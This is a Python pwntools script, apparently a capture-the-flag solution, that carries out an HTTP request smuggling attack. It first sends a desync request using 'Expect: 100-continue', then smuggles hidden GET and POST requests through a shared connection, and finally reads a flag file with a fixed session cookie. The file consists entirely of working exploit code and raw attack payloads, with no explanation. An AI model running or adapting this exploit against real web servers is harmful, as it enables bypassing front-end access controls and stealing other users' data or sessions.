from pwn import *
import time
import requests
import sys


class Challenge:


    def __init__(self, host='localhost', port=8080):
        self.host = host
        self.port = port
        

    def connect(self):
        self.conn = remote(self.host, self.port)

    def read_all(self):
        return self.conn.recvall(timeout=2).decode()
    
    def send(self, data, read=True):
        self.conn.send(data)
        if read:
            return self.read_all()
        

    def trigger_desync(self):
        DESYNC = b"""POST /index.nginx-debian.html HTTP/1.1
Host: images.example.com
Connection: close
Content-Type: image/png
Content-Length: 195
Expect: 100-continue

"""    
        self.connect()
        r = self.send(DESYNC)
        assert int(r.split("\n")[0].split(" ")[1]) >= 200 # assert that backend respond with > 2xx

    def smuggled(self):
        SMUGGLED=b"""POST /index.php HTTP/1.1
Host: localhost:9998
User-Agent: curl/8.11.1
Content-Length: 254
Connection: close
Accept: */*
Cookie: PHPSESSID=111111
Accept-Encoding: gzip
X-Forwarded-For: 172.20.0.1

GET /pwned HTTP/1.1
Host: localhost:9998
Connection: keep-alive
User-Agent: curl/8.11.1

POST /index.php?filename=flag HTTP/1.1
Host: localhost:9998
Connection: keep-alive
User-Agent: curl/8.11.4
Content-Length: 470
Accept: */*
Cookie: PHPSESSID=111111


"""
        self.connect()
        r = self.send(SMUGGLED)
        assert int(r.split("\n")[0].split(" ")[1]) == 404 # assert that server is responding to GET request (/pwned)
    
    def exploit(self):
        self.trigger_desync()
        self.smuggled()

        time.sleep(25)

        print(
            requests.get(
                f"http://{self.host}:{self.port}/index.php?filename=flag",
                cookies={
                    'PHPSESSID': "111111"
                }
            ).text
        )



if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <host> <port>")
    exit(1)


challenge = Challenge(sys.argv[1], int(sys.argv[2]))
challenge.exploit()

        
